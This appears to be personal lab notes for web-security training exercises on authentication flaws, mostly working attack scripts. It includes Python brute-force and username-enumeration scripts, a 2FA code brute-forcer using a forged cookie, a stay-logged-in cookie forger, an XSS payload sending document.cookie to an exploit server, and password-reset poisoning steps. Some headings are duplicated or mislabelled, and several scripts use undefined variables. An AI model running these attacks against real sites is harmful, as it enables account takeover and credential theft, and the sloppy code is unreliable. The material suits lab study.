# Authentication vulnerabilities

## Lab: Username enumeration via subtly different responses

Invalid username message: `Invalid username or password.`  
Valid username message: `Invalid username or password`(a dot missing)  

## Lab: Broken brute-force protection, IP block

Defense: limit the wrong attemps per IP, but reset conter when log in successfully.
Bypass: X times attemps and followed by a correct login.

```python
us_f = open("username", "r")
ps_f = open("password", "r")
passwords = ps_f.readlines()
ps_t = open("password_tmp", "w")
us_t = open("username_tmp", "w")
# wiener&peter are valid
for i in range(len(passwords)):
    if (i % 2 == 0):
        us_t.write("wiener\n")
        ps_t.write("peter\n")
    us_t.write("carlos\n")
    ps_t.write(passwords[i])
    print(passwords[i], end='')
```

## Lab: Username enumeration via account lock

```python
us_f = open("username", "r")
usernames = us_f.readlines()
ps_f = open("password", "r")
passwords = ps_f.readlines()
ps_t = open("password_tmp", "w")
us_t = open("username_tmp", "w")

for i in range(len(usernames)):
    us_t.write(usernames[i])
    ps_t.write(passwords[0])
    us_t.write(usernames[i])
    ps_t.write(passwords[1])
    us_t.write(usernames[i])
    ps_t.write(passwords[2])

ps_t.close()
us_t.close()
```

## Lab: Username enumeration via account lock
- First check with username is valid. In this lab, different message is gived, check response text length.
- Brute force password. (this lab is easy, without REAL account lock.)

```python
usf = open("usernames", "r")
usernames = usf.readlines() 

import requests

url = 'https://1a7c0051045b95cf81b74d4c0034003f.web-security-academy.net/login'
for user in usernames:
    for i in range(5):
        data = {
            'username': user[:-1], # IMPORTANT!! [:-1]! WITHOUT breaklines.
            'password': 'whatever'
        }
        response = requests.post(url, data=data)

        print(f"Status Code: {response.status_code}", end='. ')
        # print(f"Response Content: {response.text}")
        # print(user, end='')
        print(len(response.text), end=".")
        if ("Invalid username or password." in response.text):
            # print("Invalid username or password")
            print(user)
        elif ("You have made too many incorrect login attempts" in response.text):
            print("Also Found it: ", user)
        else:
            print("Found it: ", user)
```

## Lab: 2FA broken logic

Bypass:
1. change 2FA Code request cookie, `verify=carlos`
2. brute-force 2FA Code validation request:

```python
import requests

url = 'https://0afc00e803f4920e81f98935000a005d.web-security-academy.net/login2'

# Cookies
cookies = {
    'verify': 'carlos',
    'session': 'eErTh9MMiwoQBuIpyzr00GPQULR0tZKe'
}

for i in range(191, 9999):
    string = f"{i:04d}"
    # Data
    data = {
        'mfa-code': string,
    }

    # Make the POST request
    response = requests.post(url, cookies=cookies, data=data)

    # Print the response
    # print(f"Status Code: {response.status_code}")
    if ("Incorrect security code" not in response.text):
        print("Found it.", string)
    else:
        print(string, end=" ")
```

## Lab: Brute-forcing a stay-logged-in cookie

Bypass: `stay-logged-in` is `base64(username:md5(password))`. Brute-force

```python
# Lab: 2FA broken logic

import hashlib
import base64
import requests

url = 'https://0a5b009a039c341d800f7b37004a0036.web-security-academy.net/my-account?id=carlos'

# Cookies
for password in passwords:
    cookies = {
        'stay-logged-in': base64.b64encode("carlos:".encode() + hashlib.md5(password[:-1].encode()).hexdigest().encode()).decode('utf-8')
    }

    response = requests.post(url, cookies=cookies)

    # print(response.status_code, response.text)

    if ("Your username" in response.text):
        print("Found it.", password[:-1])
    else:
        print(password[:-1])
```


## Lab: Offline password cracking

1. XSS to get cookie: `<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>`
2. `cookie.stay-logged-in = base64(md5(username:password))`
3. it's a known md5 string


## Lab: Password reset broken logic

Change the Username in Password reset request: `/forgot-password`


## Lab: Password reset poisoning via middleware

```html
<button onclick="document.location=''">click here</button>

<a href="https://0af100df042c2592803d2bfb00140084.web-security-academy.net" formaction="/forgot-password?username=wiener%40exploit-0a69000d049325fc801a2a9f01280043.exploit-server.net" formmethod="post">Send POST Request</a>
```


## Lab: Password reset poisoning via middleware

Vulnerability:
- The victim clicks what ever link received.
- The `X-Forwared-Host` supported in password reset function.

Bypass:
- Change `X-Forwared-Host` of password reset function to self-controlled host. Namely, the server will generate a reset link: `https://SELF-CONTROLLED.com?token=xxx`.
- When the victim click the reset link, the token is stolen.

## Lab: Password brute-force via password change

Brute-force the change-password request, it's not defensed at all.

```python
import requests

wrong_promp = "Current password is incorrect"
correct_promp = "New passwords do not match"

url = "https://0a8700a304e421b8806fa3e40073003a.web-security-academy.net/my-account/change-password"

cookies = {
    "session": "pO3NSh1FpX3KSaFOOmkEuA6cGNqodV84",
    "session": "I2YwGoKiFc4K6M90y1wvMWLmZhXp9aZm"
}

# password = "test123"

for password in passwords:
    data = {
        "username": "carlos",
        "current-password": password, 
        "new-password-1": "test12", 
        "new-password-2": "test"
    }

    response = requests.post(url, data=data, cookies=cookies)

    if (wrong_promp in response.text): 
        print("wrong: ", password)
    elif (correct_promp in response.text):
        print("correct: ", password)
    else:
        print("something wrong", password)
```